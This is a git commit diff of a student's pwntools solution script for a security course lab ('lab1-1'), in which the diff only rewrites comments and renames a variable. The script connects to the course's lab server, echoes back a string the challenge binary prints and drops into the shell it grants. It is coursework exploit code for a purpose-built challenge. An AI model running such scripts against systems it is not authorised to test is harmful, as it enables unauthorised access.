97db99eced33ac82e63b7f71a4f8b937e8ab0f02
Joshua Bartholomew <joshua.bartholomew@trojans.dsu.edu>
2023-08-26 21:58:37 -0500

    Updated documentation and renamed some variables

--- lab1-1.py
+++ lab1-1.py
@@ -2,19 +2,23 @@ import pwn
 
 if __name__ == "__main__":
     
-    # Creating a tube to run the binary to "exploit"
-    # The first option is for testing a local binary; the second is for running against a remote service
-    # victim_binary = pwn.process("./lab1-1.bin")
-    victim_binary = pwn.remote("csc748.hostbin.org", 7011)
+    # When run, the victim binary prints a string.
+    # The binary expects the string to be copied back to it in under a second.
+    # I start with running the process.
+    process_to_exploit = pwn.remote("csc748.hostbin.org", 7011)
+    # This next line can replace the one above for testing against a local binary.
+    # process_to_exploit = pwn.process("./lab1-1.bin")
 
-    # Read and drop the introductory text printed to the screen by the binary
-    victim_binary.recvuntil(b"\n\n")
+    # I read the introductory text printed to the screen by the binary.
+    # This is really just to get it out of the way.
+    # Since it's going to be dropped, I don't need to save it to a variable.
+    process_to_exploit.recvuntil(b"\n\n")
 
-    # Read and save the string given which will win a shell
-    shell_winning_string = victim_binary.recv(15)
+    # I can now read and save the string given which will win a shell.
+    shell_winning_string = process_to_exploit.recv(15)
 
-    # Return the shell winning string to the binary
-    victim_binary.sendline(shell_winning_string)
+    # I send the shell winning string back to the binary
+    process_to_exploit.sendline(shell_winning_string)
 
-    # Drop into a shell
-    victim_binary.interactive()
+    # I can now drop into a shell.
+    process_to_exploit.interactive()
